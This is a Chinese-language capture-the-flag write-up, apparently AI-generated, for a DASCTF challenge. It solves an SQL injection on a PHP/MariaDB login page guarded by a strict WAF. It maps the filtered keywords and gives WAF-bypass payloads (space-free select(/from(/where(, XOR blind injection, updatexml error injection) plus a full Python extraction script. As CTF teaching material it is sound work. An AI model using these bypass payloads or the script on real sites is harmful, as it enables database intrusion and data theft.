---
AIGC:
  ContentProducer: '001191110102MAD55U9H0F10002'
  ContentPropagator: '001191110102MAD55U9H0F10002'
  Label: '1'
  ProduceID: 'd856b6b6-b258-4993-98ab-77886d56369c'
  PropagateID: 'd856b6b6-b258-4993-98ab-77886d56369c'
  ReservedCode1: 'ef4ae0b8-6d12-4366-9366-4b8f83f6ab9e'
  ReservedCode2: 'ef4ae0b8-6d12-4366-9366-4b8f83f6ab9e'
---

## 第113题：超难 WAF 绕过 SQL 注入（XOR 盲注 + updatexml 报错注入）

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Web - SQL 注入（WAF 绕过 + 盲注 + 报错注入） |
| 难度 | 困难（超难） |
| 日期 | 2026-08-10 |
| 来源 | DASCTF |
| 靶机 | `http://xxx.http-ctf2.dasctf.com/check.php` |
| Flag | `CTF2{7b1a0efb-46b2-462f-95c1-685580b91d78}` |

### 题目描述

PHP + MariaDB 10.3.18 应用，登录页面 `check.php` 接受 `username` 和 `password` 两个 GET 参数。页面返回三种状态："Login Success"、"Wrong password"、"逮住你了小 hacker！"（WAF 拦截）。存在极其严格的 WAF 过滤，需要逐项探测并找到所有绕过方式。

### 注入点确认

```sql
-- SQL 结构（推断）
SELECT * FROM users WHERE username='INPUT' AND password='INPUT'
```

- 单引号闭合字符串
- `#` 注释符有效（必须 URL 编码为 `%23`，否则被浏览器/服务器当作 URL fragment）
- 响应差异：Login Success（查询有结果）、Wrong password（查询无结果）、逮住你了（WAF 拦截）

### 关键陷阱：URL 编码

```python
# 错误：requests.get(params=...) 会二次编码 % -> %25
# 错误：urllib.parse.quote() 也会编码 %
# 正确：手动拼接 URL，仅替换 ' → %27, # → %23, 空格 → %0a

for ch in payload:
    if ch == "'": encoded += "%27"
    elif ch == "#": encoded += "%23"
    elif ch == " ": encoded += "%0a"
    else: encoded += ch
url = TARGET + "?username=" + encoded + "&password=1"
```

### WAF 过滤规则（完整探测）

WAF 核心检测模式：**关键词 + 任意空白字符**（空格/%0a/%09/%0b/%0c/%0d）→ 拦截。但关键词**单独**不被过滤。

| 分类 | 被过滤 (BLOCKED) | 可用 (PASS) |
|------|---------|------|
| 逻辑运算 | `and`, `or`, `not`, `&&`, `\|\|`, `!` | `^`（异或） |
| 比较运算 | `=`, `>`, `<`, `!=`, `between`, `in`, `like`, `regexp` | 无（用函数替代） |
| 算术运算 | `+`, `*`, `&`, `\|`, `~`, `<<`, `>>`, `mod`, `div` | `-`, `/`, `%` |
| 查询关键词 | `union`, `into`, `insert`, `drop`, `having`, `by`, `handler`, `join`, `outfile`, `load_file` | `select`(无空格时), `from`(无空格时), `where`, `limit` |
| 字符串函数 | `substr`, `substring`, `mid`, `ascii`, `char`, `hex`, `bin`, `char_length`, `greatest`, `cast` | `ord()`, `left()`, `right()`, `length()`, `concat()`, `group_concat()`, `locate()`, `instr()`, `strcmp()`, `least()` |
| 注入函数 | `if`, `case`, `when`, `sleep`, `benchmark` | `updatexml()`, `extractvalue()`, `floor()`, `count()`, `exp()` |
| 注释 | `/**/`, `-- ` (带空格) | `#`（编码为 `%23`） |

#### WAF 核心检测规则详解

```
检测模式: 关键词 + 任意空白字符(\s, %0a, %09, %0b, %0c, %0d)

select + 空白  → BLOCKED    select(  → PASS     select%0a  → BLOCKED
from   + 空白  → BLOCKED    from(    → PASS     from%0a    → BLOCKED
where  + 空白  → BLOCKED    where(   → PASS     where%0a   → BLOCKED
limit  + 空白  → BLOCKED    limit(   → PASS/syntax error
```

**关键发现：`where(` 无空格写法可完全绕过 WAF！** 
**关键发现：`limit` + 任何空白字符（%0a/%09/%0b/%0c）均被拦截，`limit(` 语法不合法。必须避免使用 `limit`，改用 `group_concat` 一次性获取所有数据。**

### 绕过技术总结

| 技术编号 | 语法 | 说明 |
|---------|------|------|
| 1 | `select(expr)` | select 后直接跟 `(` 而非空格，绕过 select+空白 检测 |
| 2 | `from(表名)` | from 后直接跟 `(` 而非空格，绕过 from+空白 检测 |
| 3 | `where(条件)` | where 后直接跟 `(` 而非空格，绕过 where+空白 检测 |
| 4 | `locate(a,b)` | 替代 `=` 运算符做字符串匹配，返回 1=匹配/0=不匹配 |
| 5 | `^` 异或 | 替代 `and`/`or`，构造布尔条件 |
| 6 | `ord(left/right())` | 替代 `ascii(substr())` 做字符提取 |
| 7 | `group_concat()` | 替代 `limit N,1` 逐行获取（因 limit+空白被拦截） |

### XOR 盲注原理

#### 逻辑推导

```
payload: zzzz'^expr#
SQL: WHERE (username='zzzz') ^ expr
     = WHERE (0) ^ expr        -- 'zzzz' 用户不存在，username='zzzz' 为 0
     = WHERE expr              -- 0 ^ expr = expr

结果:
  expr = 0  → WHERE 0 → 无行 → "Login Success"（登录页面特殊行为）
  expr ≠ 0  → WHERE 非零 → 有行 → "Wrong password"
```

**注意**：这里的 "Login Success" 对应条件为假（expr=0），与直觉相反。这是因为用户名不存在时数据库无匹配行，页面逻辑判断"用户名为空"时返回 Success。

#### 字符提取

```sql
-- 提取 database() 第 pos 个字符的 ASCII 值
zzzz'^(ord(right(left(database(),pos),1))-C)#
-- 当 C = 该字符 ASCII 值时，expr=0 → SUCCESS

-- 提取长度
zzzz'^(length(database())-N)#
-- 当 N = 实际长度时 → SUCCESS
```

### updatexml 报错注入原理

```sql
-- updatexml(1,concat(0x7e,EXPR),1) 触发 XPATH 语法错误
-- 错误信息回显: XPATH syntax error: '~EXPR值'
-- 回显限制约 32 字符

-- 验证
payload: zzzz'^updatexml(1,concat(0x7e,database()),1)#
回显: XPATH syntax error: '~geek'

-- 回显超出 32 字符时用 left/right 分段读取
(select(left(group_concat(col),32))from(table))      -- 前 32 字符
(select(right(group_concat(col),32))from(table))      -- 后 32 字符
(select(left(right(group_concat(col),64),32))from(table))  -- 中间段
```

### 完整利用流程

#### Step 1: 信息收集

```python
# 数据库名
updatexml(1,concat(0x7e,database()),1)  → ~geek

# MySQL 版本
updatexml(1,concat(0x7e,version()),1)   → ~10.3.18-MariaDB

# 当前用户
updatexml(1,concat(0x7e,current_user()),1) → ~root@localhost
```

#### Step 2: 获取表名

```python
# 关键: where( 无空格绕过 + group_concat 替代 limit
expr = "(select(group_concat(table_name))from(information_schema.tables)where(locate(database(),table_schema)))"
# 回显: ~H4rDsq1

# 跨库表名验证
expr = "(select(group_concat(concat(table_schema,0x7e,table_name)))from(information_schema.tables)where(locate(database(),table_schema)))"
# 回显: ~geek~H4rDsq1
```

#### Step 3: 获取列名

```python
expr = "(select(group_concat(column_name))from(information_schema.columns)where(locate(database(),table_schema)))"
# 回显: ~id,username,password
```

#### Step 4: 获取数据

```python
# 完整数据 (group_concat 一次性获取所有行)
expr = "(select(group_concat(id))from(H4rDsq1))"         → ~1
expr = "(select(group_concat(username))from(H4rDsq1))"   → ~flag
expr = "(select(group_concat(password))from(H4rDsq1))"   → ~CTF2{7b1a0efb-46b2-462f-95c1-68

# password 超过 32 字符, 用 right() 取尾部
expr = "(select(right(group_concat(password),32))from(H4rDsq1))"  → ~efb-46b2-462f-95c1-685580b91d78

# 错误注入分段拼接: CTF2{7b1a0efb-46b2-462f-95c1-68 + efb-46b2-462f-95c1-685580b91d78
# 但需要精确拼接, 盲注更可靠
```

#### Step 5: 盲注获取完整 flag（42 字符）

```python
# 1. 获取总长度
for n in range(1, 300):
    if is_zero(f"length((select(group_concat(password))from(H4rDsq1)))-{n}"):
        total_len = n  # 42
        break

# 2. 逐字符盲注
for pos in range(1, total_len + 1):
    for c in range(32, 127):
        expr = f"ord(right(left((select(group_concat(password))from(H4rDsq1)),{pos}),1))-{c}"
        if is_zero(expr):
            result += chr(c)
            break

# 结果: CTF2{7b1a0efb-46b2-462f-95c1-685580b91d78}
```

### 解题脚本

```python
import subprocess, re, sys

TARGET = "http://xxx.http-ctf2.dasctf.com/check.php"

def send(payload):
    """手动 URL 编码 (避免 requests 二次编码 %)"""
    encoded = ""
    for ch in payload:
        if ch == "'":  encoded += "%27"
        elif ch == "#": encoded += "%23"
        elif ch == " ": encoded += "%0a"
        else: encoded += ch
    url = TARGET + "?username=" + encoded + "&password=1"
    result = subprocess.run(["curl", "-s", "--max-time", "15", url],
                           capture_output=True, text=True)
    return result.stdout

def error_inject(expr):
    """updatexml 报错注入, 返回回显内容"""
    payload = f"zzzz'^updatexml(1,concat(0x7e,{expr}),1)#"
    text = send(payload)
    xpath = re.search(r"XPATH syntax error: '(.*?)'", text)
    if xpath: return xpath.group(1)
    if "逮住" in text: return "BLOCKED"
    if "Login Success" in text: return "SUCCESS"
    if "Wrong" in text: return "WRONG"
    return f"OTHER"

def is_zero(expr):
    """XOR 盲注: SUCCESS = expr 为 0"""
    payload = f"zzzz'^({expr})#"
    text = send(payload)
    return "Login Success" in text

# --- 主流程 ---
# 1. 表名
table = error_inject(
    "(select(group_concat(table_name))from(information_schema.tables)"
    "where(locate(database(),table_schema)))"
).lstrip("~")  # H4rDsq1

# 2. 列名
cols = error_inject(
    "(select(group_concat(column_name))from(information_schema.columns)"
    "where(locate(database(),table_schema)))"
).lstrip("~")  # id,username,password

# 3. 盲注 password
total_len = 0
for n in range(1, 300):
    if is_zero(f"length((select(group_concat(password))from({table})))-{n}"):
        total_len = n; break

flag = ""
for pos in range(1, total_len + 1):
    for c in range(32, 127):
        if is_zero(f"ord(right(left((select(group_concat(password))from({table})),{pos}),1))-{c}"):
            flag += chr(c); break
    sys.stdout.write(f"\r{flag}"); sys.stdout.flush()

print(f"\nFLAG: {flag}")
# CTF2{7b1a0efb-46b2-462f-95c1-685580b91d78}
```

### WAF 探测方法论

本题的 WAF 探测是解题关键，采用逐分类测试法：

```
1. 逻辑运算符:  and/or/not → BLOCKED;  ^ → PASS
2. 比较运算符:  =/>/</like/regexp → BLOCKED;  无可用 → 用函数替代
3. 算术运算符:  +/*/mod/~ → BLOCKED;  -///% → PASS
3. 字符串函数:  substr/mid/ascii/char/hex → BLOCKED;  ord/left/right/locate/concat → PASS
4. 注入函数:   if/case/sleep/benchmark → BLOCKED;  updatexml/extractvalue/floor → PASS
5. SQL关键词:  union/having/by/handler → BLOCKED;  select/from/where/limit(无空格时) → PASS
6. 注释:       /**/-- → BLOCKED;  #(%23编码) → PASS
7. 绕过验证:   select(/from(/where( → PASS (无空格绕过)
8. 确认检测模式: 关键词+任意空白字符 → BLOCKED; 关键词单独 → PASS
```

### 核心知识点

| 知识点 | 说明 |
|--------|------|
| XOR 异或盲注 | `^` 优先级低于 `=`，用不存在用户名做前缀构造 WHERE 条件 |
| updatexml 报错注入 | `concat(0x7e,EXPR)` 触发 XPATH 语法错误，错误信息中回显数据（~32 字符） |
| `where(` 无空格绕过 | SQL 关键词后直接跟 `(` 而非空格，绕过关键词+空白检测模式 |
| `from(` 无空格绕过 | 同上，`from(information_schema.tables)` 无空格写法 |
| `select(` 无空格绕过 | 同上，`select(expr)` 等价于 `select expr` |
| `group_concat` 替代 `limit` | `limit`+任何空白均被拦截，用 `group_concat` 一次性获取所有行 |
| `locate()` 替代 `=` | `locate(a,b)` 返回 1=包含/0=不包含，替代被过滤的 `=` 运算符 |
| `ord(left/right())` 替代 `ascii(substr())` | substr/ascii 被过滤，用 ord+left/right 做字符提取 |
| URL 编码陷阱 | Python requests 会二次编码 `%`，必须手动拼接 URL |
| `#` 注释需 URL 编码 | 未编码的 `#` 被当作 URL fragment，必须编码为 `%23` |

### 同类变体与扩展

- 若 `updatexml` 被过滤，可尝试 `extractvalue()`（类似回显机制，32 字符限制）
- 若 `^` 被过滤，可尝试 `-` / `/` 做算术条件（`expr-N=0` 时匹配）
- 若 `locate` 被过滤，可尝试 `instr()` / `strcmp()` 做字符串匹配
- 若 `group_concat` 被过滤，可尝试 `reverse()` + `left()` 组合分段读取
- 若 `where(` 被拦截，可尝试子查询派生表 `from(select expr from table where(...))t`（注意嵌套 `select(` 和 `from(`）
- `floor(count(*) rand() group by)` 可做另一种报错注入（无 32 字符限制但 payload 更复杂）
- MariaDB 10.x 特有函数如 `extractvalue` 行为与 MySQL 基本一致

> AI生成